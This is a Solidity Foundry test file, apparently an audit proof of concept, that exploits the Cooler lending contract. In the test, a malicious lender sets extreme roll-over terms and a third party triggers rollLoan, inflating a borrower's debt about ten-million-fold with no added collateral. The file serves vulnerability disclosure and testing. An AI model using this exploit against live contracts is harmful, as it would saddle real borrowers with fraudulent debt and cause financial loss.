// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import {Cooler} from "src/Cooler.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

/**************************************************
 * Test-helpers
 **************************************************/

/// @dev Minimal ERC20 that lets us freely mint for test purposes.
contract TestERC20 is ERC20 {
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Stand-alone Cooler clone with hard-coded immutable args
///      to avoid the complexity of the production cloning setup.
///      All Cooler logic remains unmodified.
contract TestableCooler is Cooler {
    address private immutable _owner;
    ERC20  private immutable _collateral;
    ERC20  private immutable _debt;

    constructor(address owner_, ERC20 collateral_, ERC20 debt_) {
        _owner      = owner_;
        _collateral = collateral_;
        _debt       = debt_;
    }

    /* ------------- overriden immutable getters ------------- */

    function owner() public view override returns (address) {
        return _owner;
    }

    function collateral() public view override returns (ERC20) {
        return _collateral;
    }

    function debt() public view override returns (ERC20) {
        return _debt;
    }

    // We do not need a real factory in the PoC. Returning address(0)
    // is sufficient – external calls to address(0) are benign.
    function factory() public view override returns (CoolerFactory _factory) {
        return CoolerFactory(address(0));
    }
}

/**************************************************
 * Exploit test
 **************************************************/
contract ExploitTest is Test {
    using SafeTransferLib for ERC20;

    /* ------------- actors ------------- */
    address borrower = address(0xB0b); // borrower / owner of collateral
    address lender   = address(0x1EaF); // malicious lender
    address stranger = address(0xCAFE); // any 3rd-party account

    /* ------------- test state ------------- */
    TestERC20 collateral;
    TestERC20 debt;
    TestableCooler cooler;

    /* ------------- constants ------------- */
    uint256 internal constant ONE_YEAR   = 365 days;
    uint256 internal constant PRINCIPAL  = 1_000 ether;   // 1 000 debt tokens
    uint256 internal constant INT_5_PC   = 5e16;          // 5 % (5 * 10¹⁶ / 10¹⁸)
    uint256 internal constant LTC_10_TO1 = 10 ether;      // 10 debt : 1 collateral

    /* ------------- set-up ------------- */
    function setUp() public {
        // Deploy simple ERC20s
        collateral = new TestERC20("Collateral", "COL", 18);
        debt       = new TestERC20("Debt",       "DEBT", 18);

        // Fund actors
        collateral.mint(borrower, 1_000 ether);           // plenty of collateral
        debt.mint(lender,     1_000_000_000 ether);       // plenty of debt tokens

        // Deploy testable Cooler instance
        cooler = new TestableCooler(borrower, collateral, debt);

        // Approvals
        vm.startPrank(borrower);
        collateral.approve(address(cooler), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(lender);
        debt.approve(address(cooler), type(uint256).max);
        vm.stopPrank();
    }

    /**************************************************
     * Vulnerability demonstration
     **************************************************/
    function testDebtInflationExploit() public {
        /* -------------------------------------------
           1. Borrower opens a normal loan request
        ------------------------------------------- */
        vm.startPrank(borrower);
        uint256 reqID = cooler.requestLoan(
            PRINCIPAL,                  // 1 000 debt tokens
            INT_5_PC,                   // 5 % APR
            LTC_10_TO1,                 // 10 : 1 LTV
            ONE_YEAR                    // 1 year duration
        );
        vm.stopPrank();

        /* -------------------------------------------
           2. Lender clears the request (loan is live)
        ------------------------------------------- */
        vm.startPrank(lender);
        uint256 loanID = cooler.clearRequest(reqID, true /* repayDirect */, false /* callback */);
        vm.stopPrank();

        // Baseline figures
        Cooler.Loan memory loanBefore = cooler.getLoan(loanID);
        uint256 originalDebt       = loanBefore.amount;      // expected ≈ 1 050
        uint256 originalCollateral = loanBefore.collateral;  // expected =   100

        /* -------------------------------------------
           3. Malicious lender unilaterally sets
              absurd roll-over terms
        ------------------------------------------- */
        vm.startPrank(lender);
        cooler.provideNewTermsForRoll(
            loanID,
            10_000_000 ether,  // 10 000 000 % APR
            1_000 ether,       // huge LTC so no extra collateral
            ONE_YEAR           // another year
        );
        vm.stopPrank();

        /* -------------------------------------------
           4. ANY account can activate the bad terms.
              Even an unrelated stranger will do.
        ------------------------------------------- */
        vm.prank(stranger);
        cooler.rollLoan(loanID);

        /* -------------------------------------------
           5. Assertions – exploit succeeded
        ------------------------------------------- */
        Cooler.Loan memory loanAfter = cooler.getLoan(loanID);

        // Debt was inflated ~10 000 000× (≈ 10.5 B tokens)
        assertGt(loanAfter.amount, originalDebt * 1_000_000);

        // No additional collateral was required
        assertEq(loanAfter.collateral, originalCollateral);

        // The test proves that the lender can
        //   • massively increase borrower debt, and
        //   • do so without asking for extra collateral,
        // all in a permissionless manner.
    }
}